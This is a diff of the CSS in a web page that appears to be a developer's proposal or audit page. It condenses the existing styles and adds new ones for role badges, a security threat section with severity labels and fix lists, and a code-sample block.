@@ -7,431 +7,325 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;1,9..40,300&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css" />
-
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     :root {
-      --navy:   #0c1b3a;
-      --navy2:  #1a3a6b;
-      --orange: #e85d26;
-      --orange2:#f97d45;
-      --bg:     #ffffff;
-      --bg2:    #f4f6f9;
-      --border: #e0e4eb;
-      --t1:     #0c1b3a;
-      --t2:     #6b7385;
-      --green:  #2a7a4b;
-      --red:    #c0392b;
-      --amber:  #b45309;
-      --font-head: 'Syne', system-ui, sans-serif;
-      --font-body: 'DM Sans', system-ui, sans-serif;
-      --nav-h: 64px;
+      --navy:#0c1b3a; --navy2:#1a3a6b; --orange:#e85d26; --orange2:#f97d45;
+      --bg:#ffffff; --bg2:#f4f6f9; --border:#e0e4eb; --t1:#0c1b3a; --t2:#6b7385;
+      --green:#2a7a4b; --red:#c0392b; --amber:#b45309;
+      --font-head:'Syne',system-ui,sans-serif; --font-body:'DM Sans',system-ui,sans-serif;
+      --nav-h:64px;
     }
+    html { scroll-behavior:smooth; }
+    body { font-family:var(--font-body); background:#edf0f6; color:var(--t1); min-height:100vh; }
 
-    html { scroll-behavior: smooth; }
-
-    body {
-      font-family: var(--font-body);
-      background: #edf0f6;
-      color: var(--t1);
-      min-height: 100vh;
-    }
-
-    /* ───────────── NAV ───────────── */
+    /* NAV */
     nav {
-      position: sticky; top: 0; z-index: 100;
-      height: var(--nav-h);
-      background: rgba(12, 27, 58, 0.97);
-      backdrop-filter: blur(16px);
-      display: flex; align-items: center; justify-content: space-between;
-      padding: 0 2rem;
-      border-bottom: 1px solid rgba(255,255,255,0.06);
+      position:sticky; top:0; z-index:100; height:var(--nav-h);
+      background:rgba(12,27,58,0.97); backdrop-filter:blur(16px);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 2rem; border-bottom:1px solid rgba(255,255,255,0.06);
     }
-    .nav-brand {
-      display: flex; align-items: center; gap: 10px;
-      font-family: var(--font-head);
-      font-weight: 700; font-size: 15px; color: #fff;
-      text-decoration: none; letter-spacing: 0.3px;
-    }
-    .nav-brand-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--orange); display: inline-block; }
-    .nav-links { display: flex; gap: 2rem; list-style: none; }
-    .nav-links a {
-      font-size: 13px; color: rgba(255,255,255,0.55); text-decoration: none;
-      transition: color 0.2s; font-weight: 400;
-    }
-    .nav-links a:hover { color: rgba(255,255,255,0.9); }
-    .nav-cta {
-      font-size: 12px; font-weight: 600; padding: 8px 18px; border-radius: 6px;
-      background: var(--orange); color: #fff; text-decoration: none;
-      transition: background 0.2s; font-family: var(--font-head);
-    }
-    .nav-cta:hover { background: #d04e1e; }
-    .nav-mobile-toggle { display: none; flex-direction: column; gap: 5px; cursor: pointer; padding: 4px; }
-    .nav-mobile-toggle span { width: 22px; height: 2px; background: rgba(255,255,255,0.7); border-radius: 2px; }
+    .nav-brand { display:flex; align-items:center; gap:10px; font-family:var(--font-head); font-weight:700; font-size:15px; color:#fff; text-decoration:none; }
+    .nav-brand-dot { width:8px; height:8px; border-radius:50%; background:var(--orange); display:inline-block; }
+    .nav-links { display:flex; gap:2rem; list-style:none; }
+    .nav-links a { font-size:13px; color:rgba(255,255,255,0.55); text-decoration:none; transition:color .2s; }
+    .nav-links a:hover { color:rgba(255,255,255,0.9); }
+    .nav-cta { font-size:12px; font-weight:600; padding:8px 18px; border-radius:6px; background:var(--orange); color:#fff; text-decoration:none; transition:background .2s; font-family:var(--font-head); }
+    .nav-cta:hover { background:#d04e1e; }
+    .nav-mobile-toggle { display:none; flex-direction:column; gap:5px; cursor:pointer; padding:4px; }
+    .nav-mobile-toggle span { width:22px; height:2px; background:rgba(255,255,255,0.7); border-radius:2px; }
 
-    /* ───────────── PAGE WRAP ───────────── */
-    .page-wrap {
-      max-width: 800px;
-      margin: 2.5rem auto;
-      padding: 0 1rem 4rem;
-      display: flex; flex-direction: column; gap: 0;
-    }
+    /* PAGE WRAP */
+    .page-wrap { max-width:820px; margin:2.5rem auto; padding:0 1rem 4rem; display:flex; flex-direction:column; gap:0; }
 
-    .card {
-      background: var(--bg);
-      border-radius: 20px;
-      box-shadow: 0 2px 24px rgba(12,27,58,0.08);
-      overflow: hidden;
-    }
-    .card + .card { margin-top: 1.25rem; }
-    .card-inner { padding: 2rem 2rem; }
+    .card { background:var(--bg); border-radius:20px; box-shadow:0 2px 24px rgba(12,27,58,0.08); overflow:hidden; }
+    .card + .card { margin-top:1.25rem; }
+    .card-inner { padding:2rem; }
 
-    /* ───────────── HERO ───────────── */
+    /* HERO */
     .hero {
-      background: linear-gradient(140deg, #060e20 0%, #0c1b3a 50%, #1a3a6b 80%, #2a4f8a 100%);
-      border-radius: 20px;
-      padding: 3rem 2.5rem 2.5rem;
-      position: relative; overflow: hidden;
-      box-shadow: 0 8px 40px rgba(12,27,58,0.28);
+      background:linear-gradient(140deg,#060e20 0%,#0c1b3a 50%,#1a3a6b 80%,#2a4f8a 100%);
+      border-radius:20px; padding:3rem 2.5rem 2.5rem;
+      position:relative; overflow:hidden; box-shadow:0 8px 40px rgba(12,27,58,0.28);
     }
-    .hero-orb1 {
-      position: absolute; top: -60px; right: -60px;
-      width: 280px; height: 280px; border-radius: 50%;
-      background: radial-gradient(circle, rgba(232,93,38,0.25) 0%, transparent 70%);
-      pointer-events: none;
-    }
-    .hero-orb2 {
-      position: absolute; bottom: -40px; left: -20px;
-      width: 180px; height: 180px; border-radius: 50%;
-      background: radial-gradient(circle, rgba(26,58,107,0.4) 0%, transparent 70%);
-      pointer-events: none;
-    }
-    .hero-orb3 {
-      position: absolute; top: 40%; left: 40%;
-      width: 320px; height: 320px; border-radius: 50%;
-      background: radial-gradient(circle, rgba(232,93,38,0.06) 0%, transparent 60%);
-      pointer-events: none;
-    }
-    .hero-eyebrow {
-      font-size: 10px; letter-spacing: 3px; text-transform: uppercase;
-      color: rgba(255,255,255,0.45); margin-bottom: 1rem;
-      font-family: var(--font-head); font-weight: 500;
-    }
-    .hero-title {
-      font-family: var(--font-head);
-      font-size: 34px; font-weight: 800; color: #fff;
-      line-height: 1.2; margin-bottom: 0.75rem;
-      letter-spacing: -0.5px;
-    }
-    .hero-title em { color: var(--orange2); font-style: normal; }
-    .hero-sub {
-      font-size: 15px; color: rgba(255,255,255,0.58); line-height: 1.65;
-      max-width: 520px; font-weight: 300;
-    }
-    .hero-meta {
-      display: flex; gap: 2rem; margin-top: 2rem; flex-wrap: wrap;
-      border-top: 1px solid rgba(255,255,255,0.08); padding-top: 1.5rem;
-    }
-    .hero-badge {
-      font-size: 12px; color: rgba(255,255,255,0.65);
-      display: flex; align-items: center; gap: 7px;
-      font-weight: 400;
-    }
-    .hero-badge i { font-size: 15px; color: var(--orange2); }
+    .hero-orb1 { position:absolute; top:-60px; right:-60px; width:280px; height:280px; border-radius:50%; background:radial-gradient(circle,rgba(232,93,38,0.25) 0%,transparent 70%); pointer-events:none; }
+    .hero-orb2 { position:absolute; bottom:-40px; left:-20px; width:180px; height:180px; border-radius:50%; background:radial-gradient(circle,rgba(26,58,107,0.4) 0%,transparent 70%); pointer-events:none; }
+    .hero-eyebrow { font-size:10px; letter-spacing:3px; text-transform:uppercase; color:rgba(255,255,255,0.45); margin-bottom:1rem; font-family:var(--font-head); }
+    .hero-title { font-family:var(--font-head); font-size:34px; font-weight:800; color:#fff; line-height:1.2; margin-bottom:0.75rem; letter-spacing:-0.5px; }
+    .hero-title em { color:var(--orange2); font-style:normal; }
+    .hero-sub { font-size:15px; color:rgba(255,255,255,0.58); line-height:1.65; max-width:520px; font-weight:300; }
+    .hero-meta { display:flex; gap:2rem; margin-top:2rem; flex-wrap:wrap; border-top:1px solid rgba(255,255,255,0.08); padding-top:1.5rem; }
+    .hero-badge { font-size:12px; color:rgba(255,255,255,0.65); display:flex; align-items:center; gap:7px; }
+    .hero-badge i { font-size:15px; color:var(--orange2); }
 
-    /* ───────────── SECTION LABEL ───────────── */
+    /* SECTION LABEL */
     .section-label {
-      font-size: 10px; letter-spacing: 2.5px; text-transform: uppercase;
-      color: var(--t2); margin-bottom: 1.25rem;
-      display: flex; align-items: center; gap: 8px;
-      font-family: var(--font-head); font-weight: 600;
+      font-size:10px; letter-spacing:2.5px; text-transform:uppercase; color:var(--t2);
+      margin-bottom:1.25rem; display:flex; align-items:center; gap:8px;
+      font-family:var(--font-head); font-weight:600;
     }
-    .section-label i { font-size: 14px; color: var(--orange); }
-    .section-label::after { content: ''; flex: 1; height: 0.5px; background: var(--border); }
+    .section-label i { font-size:14px; color:var(--orange); }
+    .section-label::after { content:''; flex:1; height:0.5px; background:var(--border); }
 
-    /* ───────────── PROOF OF WORK / DEMO SECTION ───────────── */
-    .demo-section { padding: 2rem; }
-    .demo-intro {
-      font-size: 13.5px; color: var(--t2); line-height: 1.7; margin-bottom: 1.5rem;
-      padding: 1rem 1.25rem;
-      background: linear-gradient(135deg, #e6f1fb, #f4f6f9);
-      border-radius: 10px; border-left: 3px solid var(--navy2);
-    }
-    .demo-intro strong { color: var(--navy); }
-    .demo-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-    .demo-card {
-      border-radius: 14px; overflow: hidden;
-      border: 1px solid var(--border);
-      transition: box-shadow 0.25s, transform 0.25s;
-      position: relative;
-    }
-    .demo-card:hover { box-shadow: 0 8px 32px rgba(12,27,58,0.14); transform: translateY(-3px); }
-    .demo-thumb {
-      height: 150px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 40px;
-      position: relative; overflow: hidden;
-    }
-    .demo-thumb-1 { background: linear-gradient(135deg, #0c1b3a 0%, #1a3a6b 60%, #2563eb 100%); }
-    .demo-thumb-2 { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 60%, #0f3460 100%); }
-    .demo-thumb-grid {
-      position: absolute; inset: 0;
-      background-image:
-        linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255,255,255,0.04) 1px, transparent 1px);
-      background-size: 24px 24px;
-    }
-    .demo-thumb-icon {
-      position: relative; z-index: 1;
-      width: 56px; height: 56px; border-radius: 14px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 26px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.4);
-    }
-    .demo-thumb-icon-1 { background: rgba(232,93,38,0.9); color: #fff; }
-    .demo-thumb-icon-2 { background: rgba(255,255,255,0.12); color: #fff; border: 1px solid rgba(255,255,255,0.2); }
-    .demo-body { padding: 1.1rem 1.1rem 1rem; background: var(--bg); }
-    .demo-tag {
-      font-size: 10px; letter-spacing: 1.5px; text-transform: uppercase;
-      color: var(--orange); font-family: var(--font-head); font-weight: 700;
-      margin-bottom: 4px;
-    }
-    .demo-title { font-size: 14px; font-weight: 600; color: var(--t1); margin-bottom: 4px; font-family: var(--font-head); }
-    .demo-desc { font-size: 12px; color: var(--t2); line-height: 1.55; margin-bottom: 10px; }
-    .demo-tech { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 10px; }
-    .demo-chip {
-      font-size: 10px; padding: 2px 8px; border-radius: 20px;
-      background: #e6f1fb; color: #185fa5; font-weight: 500;
-      border: 0.5px solid #b5d4f4;
-    }
-    .demo-link {
-      display: inline-flex; align-items: center; gap: 6px;
-      font-size: 12px; font-weight: 600; color: var(--navy2);
-      text-decoration: none; padding: 6px 12px; border-radius: 6px;
-      background: var(--bg2); border: 0.5px solid var(--border);
-      transition: all 0.2s; font-family: var(--font-head);
-    }
-    .demo-link:hover { background: var(--navy2); color: #fff; border-color: var(--navy2); }
-    .demo-live-badge {
-      position: absolute; top: 10px; right: 10px;
-      font-size: 10px; font-weight: 700; letter-spacing: 1px;
-      background: rgba(42, 122, 75, 0.9); color: #fff;
-      padding: 3px 8px; border-radius: 20px;
-      display: flex; align-items: center; gap: 5px;
-      font-family: var(--font-head);
-    }
-    .live-dot { width: 6px; height: 6px; border-radius: 50%; background: #7ef5a0; animation: pulse 1.6s infinite; }
-    @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
+    /* DEMO SECTION */
+    .demo-section { padding:2rem; }
+    .demo-intro { font-size:13.5px; color:var(--t2); line-height:1.7; margin-bottom:1.5rem; padding:1rem 1.25rem; background:linear-gradient(135deg,#e6f1fb,#f4f6f9); border-radius:10px; border-left:3px solid var(--navy2); }
+    .demo-intro strong { color:var(--navy); }
+    .demo-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+    .demo-card { border-radius:14px; overflow:hidden; border:1px solid var(--border); transition:box-shadow .25s,transform .25s; position:relative; }
+    .demo-card:hover { box-shadow:0 8px 32px rgba(12,27,58,0.14); transform:translateY(-3px); }
+    .demo-thumb { height:160px; display:flex; align-items:center; justify-content:center; font-size:40px; position:relative; overflow:hidden; }
+    .demo-thumb-1 { background:linear-gradient(135deg,#0c1b3a 0%,#1a3a6b 60%,#2563eb 100%); }
+    .demo-thumb-2 { background:linear-gradient(135deg,#07111c 0%,#0f1e2d 50%,#162840 100%); }
+    .demo-thumb-grid { position:absolute; inset:0; background-image:linear-gradient(rgba(255,255,255,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.04) 1px,transparent 1px); background-size:24px 24px; }
+    .demo-thumb-icon { position:relative; z-index:1; width:56px; height:56px; border-radius:14px; display:flex; align-items:center; justify-content:center; font-size:26px; box-shadow:0 4px 20px rgba(0,0,0,0.4); }
+    .demo-thumb-icon-1 { background:rgba(232,93,38,0.9); color:#fff; }
+    .demo-thumb-icon-2 { background:rgba(200,146,10,0.25); color:#f0c040; border:1px solid rgba(200,146,10,0.4); }
+    .demo-body { padding:1.1rem; background:var(--bg); }
+    .demo-tag { font-size:10px; letter-spacing:1.5px; text-transform:uppercase; color:var(--orange); font-family:var(--font-head); font-weight:700; margin-bottom:4px; }
+    .demo-title { font-size:14px; font-weight:600; color:var(--t1); margin-bottom:6px; font-family:var(--font-head); }
+    .demo-desc { font-size:12px; color:var(--t2); line-height:1.6; margin-bottom:10px; }
+    .demo-feature-list { margin-bottom:10px; }
+    .demo-feature-list li { font-size:11.5px; color:var(--t2); list-style:none; padding-left:14px; position:relative; line-height:1.7; }
+    .demo-feature-list li::before { content:'→'; position:absolute; left:0; color:var(--orange); font-size:10px; }
+    .demo-tech { display:flex; flex-wrap:wrap; gap:4px; margin-bottom:10px; }
+    .demo-chip { font-size:10px; padding:2px 8px; border-radius:20px; background:#e6f1fb; color:#185fa5; font-weight:500; border:0.5px solid #b5d4f4; }
+    .demo-chip-gold { background:#fef8e7; color:#92640c; border-color:#f5d78a; }
+    .demo-link { display:inline-flex; align-items:center; gap:6px; font-size:12px; font-weight:600; color:var(--navy2); text-decoration:none; padding:6px 12px; border-radius:6px; background:var(--bg2); border:0.5px solid var(--border); transition:all .2s; font-family:var(--font-head); }
+    .demo-link:hover { background:var(--navy2); color:#fff; border-color:var(--navy2); }
+    .demo-live-badge { position:absolute; top:10px; right:10px; font-size:10px; font-weight:700; letter-spacing:1px; background:rgba(42,122,75,0.9); color:#fff; padding:3px 8px; border-radius:20px; display:flex; align-items:center; gap:5px; font-family:var(--font-head); }
+    .live-dot { width:6px; height:6px; border-radius:50%; background:#7ef5a0; animation:pulse 1.6s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
 
-    /* ───────────── AUDIT / STACK ───────────── */
-    .stack-table { width: 100%; border-collapse: collapse; font-size: 13px; margin-bottom: 0.25rem; }
-    .stack-table th {
-      text-align: left; font-weight: 600; font-size: 10px;
-      letter-spacing: 1.5px; text-transform: uppercase; color: var(--t2);
-      padding: 6px 10px; border-bottom: 0.5px solid var(--border);
-      font-family: var(--font-head);
+    /* ROLE BADGES */
+    .demo-roles { display:flex; gap:5px; flex-wrap:wrap; margin-bottom:10px; }
+    .role-badge { font-size:10px; padding:2px 9px; border-radius:4px; font-weight:600; font-family:var(--font-head); }
+    .rb-admin { background:#fce8e8; color:#a32d2d; }
+    .rb-teacher { background:#e8f3e8; color:#2a6b2a; }
+    .rb-student { background:#e6f1fb; color:#185fa5; }
+    .rb-3d { background:#f3e8f8; color:#6b2da3; }
+    .rb-live { background:#e8faf0; color:#1a6e47; }
+
+    /* AUDIT STACK */
+    .stack-table { width:100%; border-collapse:collapse; font-size:13px; }
+    .stack-table th { text-align:left; font-weight:600; font-size:10px; letter-spacing:1.5px; text-transform:uppercase; color:var(--t2); padding:6px 10px; border-bottom:0.5px solid var(--border); font-family:var(--font-head); }
+    .stack-table td { padding:9px 10px; border-bottom:0.5px solid var(--border); color:var(--t1); vertical-align:top; }
+    .stack-table tr:last-child td { border-bottom:none; }
+    .stack-table td:first-child { color:var(--t2); font-size:12px; width:120px; font-weight:500; }
+    .stack-table td:last-child { font-size:12px; color:var(--t2); }
+    .pill { display:inline-block; font-size:10px; padding:2px 8px; border-radius:20px; margin-right:4px; font-weight:600; font-family:var(--font-head); }
+    .pill-red { background:#fcebeb; color:#a32d2d; }
+    .pill-amber { background:#faeeda; color:#854f0b; }
+    .pill-green { background:#eaf3de; color:#3b6d11; }
+    .pill-blue { background:#e6f1fb; color:#185fa5; }
+
+    /* PAIN POINTS */
+    .audit-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+    .audit-card { background:var(--bg2); border-radius:10px; padding:1rem; border:0.5px solid var(--border); }
+    .audit-card.bad { border-left:3px solid #e24b4a; }
+    .audit-card.warn { border-left:3px solid #ef9f27; }
+    .audit-card.ok { border-left:3px solid #63991f; }
+    .audit-title { font-size:12px; font-weight:600; color:var(--t1); margin-bottom:4px; font-family:var(--font-head); }
+    .audit-desc { font-size:12px; color:var(--t2); line-height:1.55; }
+    .status-dot { display:inline-block; width:7px; height:7px; border-radius:50%; margin-right:5px; vertical-align:middle; }
+    .dot-bad { background:#e24b4a; }
+    .dot-warn { background:#ef9f27; }
+    .dot-ok { background:#63991f; }
+
+    /* ─── SECURITY SECTION ─── */
+    .sec-intro-banner {
+      background:linear-gradient(135deg,#1a0a0a,#2d0f0f);
+      border:1px solid rgba(220,60,60,0.3); border-radius:12px;
+      padding:1.1rem 1.25rem; margin-bottom:1.5rem;
+      display:flex; align-items:flex-start; gap:12px;
     }
-    .stack-table td { padding: 9px 10px; border-bottom: 0.5px solid var(--border); color: var(--t1); vertical-align: top; }
-    .stack-table tr:last-child td { border-bottom: none; }
-    .stack-table td:first-child { color: var(--t2); font-size: 12px; width: 120px; font-weight: 500; }
-    .stack-table td:last-child { font-size: 12px; color: var(--t2); }
-    .pill { display: inline-block; font-size: 10px; padding: 2px 8px; border-radius: 20px; margin-right: 4px; font-weight: 600; font-family: var(--font-head); }
-    .pill-red   { background: #fcebeb; color: #a32d2d; }
-    .pill-amber { background: #faeeda; color: #854f0b; }
-    .pill-green { background: #eaf3de; color: #3b6d11; }
-    .pill-blue  { background: #e6f1fb; color: #185fa5; }
+    .sec-intro-icon { font-size:22px; color:#ff6b6b; flex-shrink:0; margin-top:2px; }
+    .sec-intro-text { font-size:13px; color:rgba(255,255,255,0.7); line-height:1.65; }
+    .sec-intro-text strong { color:#ff9999; font-family:var(--font-head); }
 
-    /* ───────────── PAIN POINTS ───────────── */
-    .audit-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-    .audit-card { background: var(--bg2); border-radius: 10px; padding: 1rem; border: 0.5px solid var(--border); }
-    .audit-card.bad  { border-left: 3px solid #e24b4a; }
-    .audit-card.warn { border-left: 3px solid #ef9f27; }
-    .audit-card.ok   { border-left: 3px solid #63991f; }
-    .audit-title { font-size: 12px; font-weight: 600; color: var(--t1); margin-bottom: 4px; font-family: var(--font-head); }
-    .audit-desc  { font-size: 12px; color: var(--t2); line-height: 1.55; }
-    .status-dot  { display: inline-block; width: 7px; height: 7px; border-radius: 50%; margin-right: 5px; vertical-align: middle; }
-    .dot-bad  { background: #e24b4a; }
-    .dot-warn { background: #ef9f27; }
-    .dot-ok   { background: #63991f; }
-
-    /* ───────────── TABS ───────────── */
-    .proposal-tabs { display: flex; gap: 6px; margin-bottom: 1.5rem; flex-wrap: wrap; }
-    .tab-btn {
-      font-size: 12px; padding: 7px 16px; border-radius: 20px;
-      border: 0.5px solid var(--border); background: var(--bg2); color: var(--t2);
-      cursor: pointer; transition: all 0.2s; font-family: var(--font-head);
-      font-weight: 600; letter-spacing: 0.2px;
+    .threat-list { display:flex; flex-direction:column; gap:14px; }
+    .threat-card {
+      border-radius:14px; overflow:hidden;
+      border:1px solid var(--border);
+      background:var(--bg);
     }
-    .tab-btn.active { background: var(--navy); color: #fff; border-color: var(--navy); }
-    .tab-btn:hover:not(.active) { background: #e6f1fb; color: #185fa5; border-color: #b5d4f4; }
-
-    /* ───────────── PHASE BLOCKS ───────────── */
-    .phase-block { display: none; animation: fadeIn 0.3s ease; }
-    .phase-block.active { display: block; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
-
-    /* ───────────── DELIVERABLE GRID ───────────── */
-    .deliverable-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 1.5rem; }
-    .deliv-card { background: var(--bg2); border: 0.5px solid var(--border); border-radius: 12px; padding: 1rem; }
-    .deliv-icon  { font-size: 22px; color: var(--navy2); margin-bottom: 8px; }
-    .deliv-title { font-size: 13px; font-weight: 600; color: var(--t1); margin-bottom: 5px; font-family: var(--font-head); }
-    .deliv-items { font-size: 12px; color: var(--t2); line-height: 1.75; }
-    .deliv-items li { list-style: none; padding-left: 14px; position: relative; }
-    .deliv-items li::before { content: '→'; position: absolute; left: 0; color: var(--orange); font-size: 11px; }
-
-    /* ───────────── TECH CHIPS ───────────── */
-    .tech-pill-row { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 1.5rem; }
-    .tech-chip { font-size: 11px; padding: 4px 11px; border-radius: 20px; background: var(--bg2); border: 0.5px solid var(--border); color: var(--t1); font-weight: 500; }
-    .tech-chip.highlight { background: #e6f1fb; border-color: #b5d4f4; color: #185fa5; font-weight: 600; }
-
-    /* ───────────── PRICING ───────────── */
-    .pricing-row { display: flex; justify-content: space-between; align-items: center; padding: 11px 0; border-bottom: 0.5px solid var(--border); font-size: 13px; }
-    .pricing-row:last-child { border: none; padding-top: 16px; font-size: 15px; font-weight: 600; }
-    .price-label { color: var(--t2); }
-    .price-val   { color: var(--t1); font-weight: 600; font-family: var(--font-head); }
-    .price-val.total { color: var(--navy2); font-size: 18px; }
-
-    /* ───────────── TIMELINE ───────────── */
-    .tl-item { display: flex; gap: 14px; margin-bottom: 1.1rem; align-items: flex-start; }
-    .tl-num {
-      width: 30px; height: 30px; border-radius: 50%; background: var(--navy);
-      color: #fff; font-size: 12px; font-weight: 700;
-      display: flex; align-items: center; justify-content: center;
-      flex-shrink: 0; margin-top: 1px; font-family: var(--font-head);
+    .threat-header {
+      display:flex; align-items:center; gap:12px;
+      padding:1rem 1.25rem; cursor:pointer;
+      transition:background .2s; user-select:none;
+      justify-content:space-between;
     }
-    .tl-title { font-size: 13px; font-weight: 600; color: var(--t1); margin-bottom: 2px; font-family: var(--font-head); }
-    .tl-desc  { font-size: 12px; color: var(--t2); line-height: 1.55; }
-    .tl-weeks { font-size: 11px; color: var(--orange); font-weight: 600; margin-top: 3px; font-family: var(--font-head); }
+    .threat-header:hover { background:var(--bg2); }
+    .threat-header-left { display:flex; align-items:center; gap:12px; }
+    .threat-icon {
+      width:40px; height:40px; border-radius:10px;
+      display:flex; align-items:center; justify-content:center;
+      font-size:18px; flex-shrink:0;
+    }
+    .ti-crit { background:#fce8e8; color:#c0392b; }
+    .ti-high { background:#faeeda; color:#b45309; }
+    .ti-med { background:#e6f1fb; color:#185fa5; }
+    .threat-name { font-size:13.5px; font-weight:700; color:var(--t1); font-family:var(--font-head); margin-bottom:2px; }
+    .threat-short { font-size:11.5px; color:var(--t2); }
+    .threat-sev {
+      font-size:10px; padding:3px 10px; border-radius:20px;
+      font-weight:700; letter-spacing:1px; text-transform:uppercase; flex-shrink:0;
+      font-family:var(--font-head);
+    }
+    .sev-crit { background:#fce8e8; color:#c0392b; border:1px solid #f5b8b8; }
+    .sev-high { background:#faeeda; color:#b45309; border:1px solid #f5d9a5; }
+    .sev-med { background:#e6f1fb; color:#185fa5; border:1px solid #b5d4f4; }
+    .threat-chevron { font-size:14px; color:var(--t2); transition:transform .25s; flex-shrink:0; }
+    .threat-card.open .threat-chevron { transform:rotate(180deg); }
 
-    /* ───────────── COMPARE BARS ───────────── */
-    .compare-bar { margin: 1.5rem 0 0; }
-    .compare-row  { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; font-size: 12px; }
-    .compare-label { width: 130px; color: var(--t2); flex-shrink: 0; }
-    .bar-track { flex: 1; height: 6px; background: #e8eaf0; border-radius: 3px; overflow: hidden; }
-    .bar-fill-before { height: 100%; border-radius: 3px; background: #e24b4a; }
-    .bar-fill-after  { height: 100%; border-radius: 3px; background: #63991f; }
-    .bar-legend { display: flex; gap: 1rem; margin-bottom: 1rem; font-size: 11px; font-weight: 500; }
-    .bar-legend span { display: flex; align-items: center; gap: 5px; }
-    .leg-dot { width: 8px; height: 8px; border-radius: 50%; }
+    .threat-body { display:none; padding:0 1.25rem 1.25rem; border-top:1px solid var(--border); }
+    .threat-card.open .threat-body { display:block; animation:fadeIn .25s ease; }
+    @keyframes fadeIn { from{opacity:0;transform:translateY(4px)} to{opacity:1;transform:none} }
 
-    /* ───────────── FLAGS ───────────── */
-    .flag-list { margin-bottom: 1.5rem; }
-    .flag-item { display: flex; gap: 10px; padding: 10px 0; border-bottom: 0.5px solid var(--border); align-items: flex-start; font-size: 13px; }
-    .flag-item:last-child { border: none; }
-    .flag-icon { color: var(--orange); font-size: 16px; flex-shrink: 0; margin-top: 1px; }
-    .flag-text { color: var(--t1); line-height: 1.55; font-weight: 500; }
-    .flag-text span { color: var(--t2); display: block; font-size: 12px; margin-top: 2px; font-weight: 400; }
+    .threat-cols { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-bottom:14px; }
+    .threat-col-title { font-size:10px; letter-spacing:2px; text-transform:uppercase; color:var(--t2); font-family:var(--font-head); font-weight:600; margin-bottom:8px; margin-top:14px; }
+    .threat-explain { font-size:12.5px; color:var(--t2); line-height:1.75; }
+    .threat-explain code { background:#f4f6f9; border:0.5px solid var(--border); border-radius:4px; padding:1px 6px; font-size:11.5px; color:#c0392b; font-family:monospace; }
+    .threat-impact { font-size:12.5px; color:var(--t2); line-height:1.7; }
+    .threat-impact li { list-style:none; padding-left:16px; position:relative; margin-bottom:4px; }
+    .threat-impact li::before { content:'⚠'; position:absolute; left:0; font-size:10px; color:#ef9f27; }
+    .threat-solution { background:linear-gradient(135deg,#eaf3de,#f0f7e8); border-radius:10px; padding:1rem; margin-bottom:12px; }
+    .threat-sol-title { font-size:11px; font-weight:700; color:#2a6b2a; letter-spacing:1px; text-transform:uppercase; font-family:var(--font-head); margin-bottom:8px; }
+    .threat-sol-items { font-size:12.5px; color:#2a4a1a; line-height:1.8; }
+    .threat-sol-items li { list-style:none; padding-left:16px; position:relative; margin-bottom:3px; }
+    .threat-sol-items li::before { content:'✓'; position:absolute; left:0; color:#2a7a4b; font-weight:700; }
+    .threat-tech-chips { display:flex; flex-wrap:wrap; gap:5px; }
+    .ttech { font-size:10.5px; padding:3px 10px; border-radius:20px; background:#e6f1fb; color:#185fa5; font-weight:600; border:0.5px solid #b5d4f4; font-family:var(--font-head); }
+    .ttech-green { background:#eaf3de; color:#2a6b2a; border-color:#a8d88a; }
 
-    /* ───────────── CTA ───────────── */
-    .cta-bar {
-      background: linear-gradient(135deg, #060e20, #0c1b3a, #1a3a6b);
-      border-radius: 16px; padding: 1.75rem 2rem;
-      display: flex; justify-content: space-between; align-items: center;
-      gap: 1rem; flex-wrap: wrap; margin-top: 1.5rem;
-      position: relative; overflow: hidden;
+    /* CODE SAMPLE BLOCK */
+    .code-block {
+      background:#0c1b3a; border-radius:8px; padding:1rem;
+      font-size:11.5px; font-family:monospace; color:#a8c4e8;
+      line-height:1.7; margin:10px 0; overflow-x:auto;
     }
-    .cta-bar::before {
-      content: '';
-      position: absolute; top: -30px; right: -30px;
-      width: 160px; height: 160px; border-radius: 50%;
-      background: radial-gradient(circle, rgba(232,93,38,0.2) 0%, transparent 70%);
-      pointer-events: none;
-    }
-    .cta-text { color: rgba(255,255,255,0.8); font-size: 13px; line-height: 1.55; position: relative; }
-    .cta-text strong { color: #fff; font-size: 16px; display: block; margin-bottom: 4px; font-family: var(--font-head); font-weight: 700; }
-    .cta-btn {
-      background: var(--orange); color: #fff; border: none;
-      padding: 11px 24px; border-radius: 8px; font-size: 13px;
-      font-weight: 700; cursor: pointer; white-space: nowrap;
-      font-family: var(--font-head); transition: background 0.2s;
-      position: relative; letter-spacing: 0.2px;
-    }
-    .cta-btn:hover { background: #d04e1e; }
+    .code-block .kw { color:#f97d45; }
+    .code-block .str { color:#7ef5a0; }
+    .code-block .cm { color:#4a6a8a; }
+    .code-block .fn { color:#b5d4f4; }
 
-    /* ───────────── FOOTER ───────────── */
-    footer {
-      background: var(--navy);
-      padding: 2rem;
-      border-radius: 20px;
-      margin-top: 1.25rem;
-      display: flex; justify-content: space-between; align-items: center;
-      flex-wrap: wrap; gap: 1rem;
-    }
